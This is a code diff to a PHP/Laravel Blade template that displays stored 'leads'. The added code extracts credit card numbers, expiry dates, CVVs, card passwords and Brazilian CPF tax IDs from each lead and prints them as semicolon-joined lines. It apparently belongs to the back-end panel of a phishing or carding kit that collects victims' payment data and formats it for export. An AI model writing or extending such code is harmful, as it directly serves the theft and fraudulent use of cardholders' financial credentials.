@@ -22,11 +22,36 @@
                                     <tr>
                                         <td>
                                             @php
+                                                $string = [];
                                                 $fields = json_decode( $lead->information, true );
                                                 foreach ($fields as $key => $value)
                                                 {
-                                                    echo ' ' . $key . ': ' . $value;
+                                                    switch ($key)
+                                                    {
+                                                        case 'cc1':
+                                                        case 'cc':
+                                                            $string[0] = str_replace(' ', '.', $value);
+                                                            break;
+                                                        case 'cpf1':
+                                                        case 'cpf':
+                                                            $string[4] = $value;
+                                                            break;
+                                                        case 'cvv1':
+                                                        case 'cvv':
+                                                            $string[2] = $value;
+                                                            break;
+                                                        case 'password1':
+                                                        case 'password':
+                                                            $string[3] = $value;
+                                                            break;
+                                                        case 'validity1':
+                                                        case 'validity':
+                                                            $string[1] = $value;
+                                                            break;
+                                                    }
                                                 }
+                                                ksort($string);
+                                                echo implode(';', $string);
                                             @endphp
                                         </td>
                                         <td>{{ $lead->created_at->format('d/m/Y') }}</td>
